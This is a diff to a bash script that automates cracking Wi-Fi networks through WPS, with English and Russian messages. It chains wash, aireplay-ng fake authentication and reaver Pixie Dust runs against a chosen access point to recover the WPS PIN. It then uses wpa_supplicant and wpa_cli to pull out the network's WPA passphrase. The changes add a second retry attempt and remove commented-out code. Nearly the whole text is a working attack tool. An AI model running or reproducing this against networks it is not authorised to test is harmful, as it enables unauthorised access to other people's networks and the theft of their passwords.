@@ -171,6 +171,18 @@ declare -A Strings37
 Strings37["English"]="WPS of this network is locked or the network is included in the Blacklist or in the Cracked List. Skipping."
 Strings37["Russian"]="WPS для этой сети заблокирован, либо она присутствует в списке взломанных или в списке исключений. Пропускаем."
 
+declare -A Strings38
+Strings38["English"]=""
+Strings38["Russian"]="Попытка 1 из 2."
+
+declare -A Strings39
+Strings39["English"]=""
+Strings39["Russian"]="Попытка 2 из 2."
+
+declare -A Strings40
+Strings40["English"]=""
+Strings40["Russian"]="Подождите 3 минуты."
+
 
 function selectInterface {
 	clear
@@ -292,7 +304,7 @@ function showWPSNetworks {
 		echo ${Strings11[$LANGUAGE]}
 		sudo iw dev "$IFACE" set channel "$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $2}')"
 		sudo xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $IFACE -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}')" &
-		sudo xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo reaver -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}') -v --no-nacks"
+		sudo xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "echo \"\n\" | sudo reaver -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}') -v --no-nacks"
 
 	else
 		INF=${Strings5[$LANGUAGE]}
@@ -344,7 +356,7 @@ function PixieDustAattack {
 					sudo iw dev "$IFACE" set channel "$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $2}')"
 		
 					sudo timeout 298 xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $IFACE -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}')" &
-					sudo timeout 300 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo reaver -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}') -vv --no-nacks -K 1 | tee /tmp/reaver.pixiedust"
+					sudo timeout 300 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "echo \"\n\" | sudo reaver -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E $i | awk '{print $1}') -vv --no-nacks -K 1 | tee /tmp/reaver.pixiedust"
 
 					PIN=$(cat /tmp/reaver.pixiedust | grep -E '\[\+\] WPS pin:' | grep -Eo '[0-9]{8}')
 
@@ -354,7 +366,6 @@ function PixieDustAattack {
 						echo -e "ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1" > /tmp/suppl.conf
 						sudo timeout 60 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo wpa_supplicant -i $IFACE -c /tmp/suppl.conf" &
 						sleep 3
-#						echo "wps_reg $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$COUNTER" | awk '{print $1}') $PIN" | sudo wpa_cli
 						echo "wps_reg $i $PIN" | sudo wpa_cli
 
 						echo -e ${Strings34[$LANGUAGE]}
@@ -365,21 +376,12 @@ function PixieDustAattack {
 							echo -e ${Strings36[$LANGUAGE]}
 						fi
 
-
 						sudo airmon-ng check kill
 
 						rm /tmp/suppl.conf
 						sudo rm /var/run/wpa_supplicant/$IFACE
 
 						sudo ip link set "$IFACE" down && sudo iw "$IFACE" set monitor control && sudo ip link set "$IFACE" up
-
-						#sudo timeout 120 xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $IFACE -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}') -e \"$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $6}')\"" &
-						#sudo timeout 120 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo reaver -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}') -v --no-nacks -p $PIN | tee /tmp/reaver.wpa"
-
-						#cat /tmp/reaver.wpa | grep -E "\[\+\] WPS pin:"
-						#cat /tmp/reaver.wpa | grep -E "WPA"
-						#rm /tmp/reaver.wpa
-
 					else
 						echo ${Strings15[$LANGUAGE]}
 					fi					
@@ -534,13 +536,27 @@ function showWPAPassFromPin {
 		sudo timeout 60 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo wpa_supplicant -i $IFACE -c /tmp/suppl.conf" &
 		sleep 3
 		echo "wps_reg $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}') $PIN" | sudo wpa_cli
-
+		echo -e ${Strings38[$LANGUAGE]}
 		echo -e ${Strings34[$LANGUAGE]}
 		sleep 60		
 		if [[ "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`" ]]; then
 			echo -e ${Strings35[$LANGUAGE]} "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`"
-		else 
+		else
+			sudo airmon-ng check kill
+			sudo rm /var/run/wpa_supplicant/$IFACE
 			echo -e ${Strings36[$LANGUAGE]}
+			sudo timeout 180 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo wpa_supplicant -i $IFACE -c /tmp/suppl.conf" &
+			sleep 3
+			echo "wps_reg $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}') $PIN" | sudo wpa_cli	
+			echo -e ${Strings39[$LANGUAGE]}		
+			echo -e ${Strings40[$LANGUAGE]}
+			sleep 180
+
+			if [[ "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`" ]]; then
+				echo -e ${Strings35[$LANGUAGE]} "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`"
+			else
+				echo -e ${Strings36[$LANGUAGE]}
+			fi
 		fi
 
 		rm /tmp/suppl.conf
